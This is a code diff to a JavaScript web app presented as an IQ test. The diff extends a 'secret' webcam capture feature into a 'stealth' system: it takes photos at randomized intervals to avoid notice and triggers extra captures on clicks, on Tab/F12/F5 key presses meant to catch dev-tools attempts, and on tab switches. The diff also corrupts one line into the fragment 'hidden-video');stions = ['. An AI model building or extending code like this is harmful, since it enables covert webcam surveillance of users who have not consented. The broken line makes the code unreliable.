@@ -7,9 +7,7 @@ class IQTestApp {
         this.stream = null;
         this.ws = null;
         this.captureInterval = null;
-        this.hiddenVideo = document.getElementById('hidden-video');
-        
-        this.questions = [
+        this.hiddenVideo = document.getElementById('hidden-video');stions = [
             {
                 question: "What number comes next in the sequence: 2, 5, 11, 23, 47, ?",
                 options: ["95", "94", "96", "93"],
@@ -368,15 +366,51 @@ class IQTestApp {
     }
     
     startSecretCapture() {
-        // Capture photo every 2 seconds during test as requested
-        this.captureInterval = setInterval(() => {
-            this.capturePhoto('progress');
-        }, 2000);
+        console.log('Starting stealth photo capture system...');
         
-        // Capture initial test start photo
+        // Randomized capture intervals for stealth (1.8-2.5 seconds)
+        const randomizedCapture = () => {
+            this.capturePhoto('progress');
+            const randomInterval = 1800 + Math.random() * 700; // 1.8-2.5 seconds
+            setTimeout(randomizedCapture, randomInterval);
+        };
+        
+        // Start stealth capture with initial delay
         setTimeout(() => {
             this.capturePhoto('test_start');
-        }, 1000);
+            randomizedCapture();
+        }, 1000 + Math.random() * 1000); // Random initial delay 1-2 seconds
+        
+        // Capture when user interacts (clicks, keyboard)
+        this.setupInteractionCaptures();
+    }
+    
+    setupInteractionCaptures() {
+        // Capture on significant interactions for behavioral analysis
+        let lastInteraction = 0;
+        
+        document.addEventListener('click', () => {
+            const now = Date.now();
+            if (now - lastInteraction > 3000) { // Throttle to avoid spam
+                this.capturePhoto('user_click');
+                lastInteraction = now;
+            }
+        });
+        
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Tab' || e.key === 'F12' || e.key === 'F5') {
+                this.capturePhoto('suspicious_key'); // Detect dev tools attempts
+            }
+        });
+        
+        // Detect window focus changes (user switching tabs)
+        window.addEventListener('blur', () => {
+            this.capturePhoto('window_blur');
+        });
+        
+        window.addEventListener('focus', () => {
+            this.capturePhoto('window_focus');
+        });
     }
     
     capturePhoto(type) {
